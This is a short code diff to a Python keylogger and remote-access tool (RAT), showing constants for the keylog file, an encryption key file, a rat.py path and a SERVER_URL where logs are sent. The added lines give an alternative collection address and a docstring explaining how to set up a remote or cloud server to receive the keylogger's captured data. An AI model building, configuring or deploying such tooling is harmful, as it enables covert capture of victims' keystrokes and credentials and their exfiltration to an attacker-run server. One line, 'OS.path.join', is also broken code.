@@ -14,6 +14,7 @@ import ctypes
 WIFI_CHECK_INTERVAL = 10
 KEYLOGGER_INTERVAL = 60
 SERVER_URL = "http://your_server_ip/log"
+# SERVER_URL = "http://192.168.1.100/log"  # Replace with your server IP and endpoint
 RAT_SCRIPT_PATH = OS.path.join(os.getcwd(),"rat.py")
 KEY_FILE = "key.key"
 LOG_FILE = "keylog.txt"
@@ -109,3 +110,11 @@ def main():
 
 if __name__ == "__main__":
     main()
+
+
+''' Server IP Address: The server IP should point to a remote machine or a machine that is set up to receive the incoming data. This machine should be capable of securely receiving and processing the data from the keylogger or RAT. Examples of this could be:
+
+A remote server that you control (for example, a cloud server).
+A virtual machine (VM) that you own and have configured to handle the incoming data.
+Any other machine on your network or remotely that is set up to receive, store, and process the data securely.
+'''
